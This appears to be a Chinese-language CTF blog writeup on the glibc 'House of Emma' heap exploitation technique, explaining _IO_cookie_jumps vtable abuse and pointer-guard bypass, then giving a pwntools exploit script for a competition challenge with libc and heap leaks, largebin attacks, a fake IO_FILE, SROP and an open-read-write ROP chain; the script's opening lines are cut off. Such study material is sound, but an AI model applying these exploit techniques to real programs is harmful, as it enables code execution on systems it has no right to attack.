---
title: house-of-emma
date: 2023-11-13 21:36:57
tags:
- glibc
---

# House_of_emma

原文：[第七届“湖湘杯” House _OF _Emma | 设计思路与解析-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/260614#h2-1)

## 利用条件：

1. 有一个可控地址
2. 能够触发io

## 寻找合法的vtable

在 `vtable` 的合法范围内，存在一个`_IO_cookie_jumps` ：

```cpp
static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = {
 JUMP_INIT_DUMMY,
 JUMP_INIT(finish, _IO_file_finish),
 JUMP_INIT(overflow, _IO_file_overflow),
 JUMP_INIT(underflow, _IO_file_underflow),
 JUMP_INIT(uflow, _IO_default_uflow),
 JUMP_INIT(pbackfail, _IO_default_pbackfail),
 JUMP_INIT(xsputn, _IO_file_xsputn),
 JUMP_INIT(xsgetn, _IO_default_xsgetn),
 JUMP_INIT(seekoff, _IO_cookie_seekoff),
 JUMP_INIT(seekpos, _IO_default_seekpos),
 JUMP_INIT(setbuf, _IO_file_setbuf),
 JUMP_INIT(sync, _IO_file_sync),
 JUMP_INIT(doallocate, _IO_file_doallocate),
 JUMP_INIT(read, _IO_cookie_read),
 JUMP_INIT(write, _IO_cookie_write),
 JUMP_INIT(seek, _IO_cookie_seek),
 JUMP_INIT(close, _IO_cookie_close),
 JUMP_INIT(stat, _IO_default_stat),
 JUMP_INIT(showmanyc, _IO_default_showmanyc),
 JUMP_INIT(imbue, _IO_default_imbue),
};
```

vtable的检测对于具体位置的监测还是比较宽松的，所以我们可以在一定的范围内对vtable表的起始位置进行偏移，使得我们在调用偏移是固定的情况下，通过偏移来调用表中的任意函数

```cpp
static ssize_t
_IO_cookie_read (FILE *fp, void *buf, ssize_t size)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_read_function_t *read_cb = cfile->__io_functions.read;
#ifdef PTR_DEMANGLE
 PTR_DEMANGLE (read_cb);
#endif

 if (read_cb == NULL)
   return -1;

 return read_cb (cfile->__cookie, buf, size);
}

static ssize_t
_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_write_function_t *write_cb = cfile->__io_functions.write;
#ifdef PTR_DEMANGLE
 PTR_DEMANGLE (write_cb);
#endif

 if (write_cb == NULL)
  {
     fp->_flags |= _IO_ERR_SEEN;
     return 0;
  }

 ssize_t n = write_cb (cfile->__cookie, buf, size);
 if (n < size)
   fp->_flags |= _IO_ERR_SEEN;

 return n;
}

static off64_t
_IO_cookie_seek (FILE *fp, off64_t offset, int dir)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;
#ifdef PTR_DEMANGLE
 PTR_DEMANGLE (seek_cb);
#endif

 return ((seek_cb == NULL
   || (seek_cb (cfile->__cookie, &offset, dir)
       == -1)
   || offset == (off64_t) -1)
  ? _IO_pos_BAD : offset);
}

static int
_IO_cookie_close (FILE *fp)
{
 struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
 cookie_close_function_t *close_cb = cfile->__io_functions.close;
#ifdef PTR_DEMANGLE
 PTR_DEMANGLE (close_cb);
#endif

 if (close_cb == NULL)
   return 0;

 return close_cb (cfile->__cookie);
}
```

这几个函数内存在任意指针调用并且函数指针来源于 `_IO_cookie_file` 结构体，这个结构体是 `_IO_FILE_plus` 的拓展

```cpp
/* Special file type for fopencookie function. */
struct _IO_cookie_file
{
 struct _IO_FILE_plus __fp;
 void *__cookie;
 cookie_io_functions_t __io_functions;
};

typedef struct _IO_cookie_io_functions_t
{
 cookie_read_function_t *read;/* Read bytes. */
 cookie_write_function_t *write;/* Write bytes. */
 cookie_seek_function_t *seek;/* Seek/tell file position. */
 cookie_close_function_t *close;/* Close file. */
} cookie_io_functions_t;
```

同时，我们注意到，这里的每个函数都会调用自身的一个参数

```cpp
read_cb (cfile->__cookie, buf, size);
write_cb (cfile->__cookie, buf, size);
seek_cb (cfile->__cookie, &offset, dir);
close_cb (cfile->__cookie);
```

所以我们可以将它当作一个类似于 `__free_hook` 的结构来利用

`__free_hook` 结构如下, 它被定义为一个全局的宏

```c
void weak_variable (*__free_hook) (void *__ptr, const void *) = NULL;
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }
// ...
}
```

但是我们注意到在调用前指针保护，所以我们接下来就要解决指针加密的问题

`point_guard` 位于 fs:[0x30] 的位置，我们无法直接获得，但是可以利用例如 `largebin_attack` 的方法进行写入

## 一些问题：

在实际操作中，可能因为 stderr 的指针存放在 bss 段上，从而导致无法篡改。只能使用 exit 来触发 FSOP，但是又会发现如果通过 exit 来触发 FSOP，会遇到在 exit 中也有调用指针保护的函数指针执行，但此时的异或内容被我们所篡改，使得无法执行正确的函数地址，且此位置在 FSOP 之前，从而导致程序没有进入 IO 流就发生了错误。

这种时候就可以考虑构造两个 IO_FILE，且后者指针处于前者的 _chains 处，前者用 GLIBC2.34 之前的 IO_FILE 攻击 的思想在 __pointer_chk_guard 处写已知内容，后者再用 House_OF_Emma 来进行函数指针调用。

## 实战利用：House_of_emma

![img](../../../../markdown/photos/t018e5175fbce4562c8.png)

这道题是house_of_emma的模板题

表面看起来是一个vm，其实醉翁之意不在酒

![img](../../../../markdown/photos/t013cd50f758c2212d8.png)

add函数限制了size的大小

![img](../../../../markdown/photos/t01d7479a2e93c90730.png)

在delete函数中存在uaf

### 思路：

没有办法退出opcode的主循环，可以利用 `house_of_kiwi` 通过 `topchunk` 不够完成分配进行 `assert` 从而走io

1. 使用largebin attack在stderr处写入一个可控地址
2. 使用largebin attack在 `__pointer_chk_guard` 处写入一个已知地址
3. 通过写入的地址和需要调用的函数进行加密，同时构造合理的 `IO_FILE` 
4. 触发 `house_of_kiwi` 同时利用 `magic_gadget`
5. 进行orw

### EXP

```python

    all_payload += payload


def delete(idx):
    global all_payload
    payload = p8(0x2)
    payload += p8(idx)
    all_payload += payload


def edit(idx, buf):
    global all_payload
    payload = p8(0x4)
    payload += p8(idx)
    payload += p16(len(buf))
    payload += str(buf)
    all_payload += payload


def run_opcode():
    global all_payload
    all_payload += p8(5)
    sh.sendafter("Pls input the opcode", all_payload)
    all_payload = ""


# leak libc_base
add(0, 0x410)
add(1, 0x410)
add(2, 0x420)
add(3, 0x410)
delete(2)
add(4, 0x430)
show(2)
run_opcode()

libc_base = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1f30b0  # main_arena + 1104
log.success("libc_base:\t" + hex(libc_base))
libc.address = libc_base

guard = libc_base + 0x2035f0
pop_rdi_addr = libc_base + 0x2daa2
pop_rsi_addr = libc_base + 0x37c0a
pop_rax_addr = libc_base + 0x446c0
syscall_addr = libc_base + 0x883b6
gadget_addr = libc_base + 0x146020  # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
setcontext_addr = libc_base + 0x50bc0

# leak heapbase
edit(2, "a" * 0x10)
show(2)
run_opcode()
sh.recvuntil("a" * 0x10)
heap_base = u64(sh.recv(6).ljust(8, '\x00')) - 0x2ae0
log.success("heap_base:\t" + hex(heap_base))

# largebin attack stderr
delete(0)
edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(libc.sym['stderr'] - 0x20))
add(5, 0x430)
edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
add(0, 0x410)
add(2, 0x420)
run_opcode()

# largebin attack guard
delete(2)
add(6, 0x430)
delete(0)
edit(2, p64(libc_base + 0x1f30b0) * 2 + p64(heap_base + 0x2ae0) + p64(guard - 0x20))
add(7, 0x450)
edit(2, p64(heap_base + 0x22a0) + p64(libc_base + 0x1f30b0) + p64(heap_base + 0x22a0) * 2)
edit(0, p64(libc_base + 0x1f30b0) + p64(heap_base + 0x2ae0) * 3)
add(2, 0x420)
add(0, 0x410)

# change top chunk size
delete(7)
add(8, 0x430)
edit(7, 'a' * 0x438 + p64(0x300))
run_opcode()

next_chain = 0
srop_addr = heap_base + 0x2ae0 + 0x10
fake_IO_FILE = 2 * p64(0)
fake_IO_FILE += p64(0)  # _IO_write_base = 0
fake_IO_FILE += p64(0xffffffffffffffff)  # _IO_write_ptr = 0xffffffffffffffff
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(0)  # _IO_buf_base
fake_IO_FILE += p64(0)  # _IO_buf_end
fake_IO_FILE = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(next_chain)  # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heap_base)  # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xB0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xC8, '\x00')
fake_IO_FILE += p64(libc.sym['_IO_cookie_jumps'] + 0x40)  # vtable
fake_IO_FILE += p64(srop_addr)  # rdi
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_base + 0x22a0), 0x11))

fake_frame_addr = srop_addr
frame = SigreturnFrame()
frame.rdi = fake_frame_addr + 0xF8
frame.rsi = 0
frame.rdx = 0x100
frame.rsp = fake_frame_addr + 0xF8 + 0x10
frame.rip = pop_rdi_addr + 1  # : ret

rop_data = [
    pop_rax_addr,  # sys_open('flag', 0)
    2,
    syscall_addr,

    pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
    0,
    pop_rdi_addr,
    3,
    pop_rsi_addr,
    fake_frame_addr + 0x200,
    syscall_addr,

    pop_rax_addr,  # sys_write(1, heap, 0x100)
    1,
    pop_rdi_addr,
    1,
    pop_rsi_addr,
    fake_frame_addr + 0x200,
    syscall_addr
]
payload = p64(0) + p64(fake_frame_addr) + '\x00' * 0x10 + p64(setcontext_addr + 61)
payload += str(frame).ljust(0xF8, '\x00')[0x28:] + 'flag'.ljust(0x10, '\x00') + flat(rop_data)

edit(0, fake_IO_FILE)
edit(2, payload)

add(8, 0x450)  # House OF Kiwi
# gdb.attach(sh, "b _IO_cookie_write")
run_opcode()
sh.interactive()
```

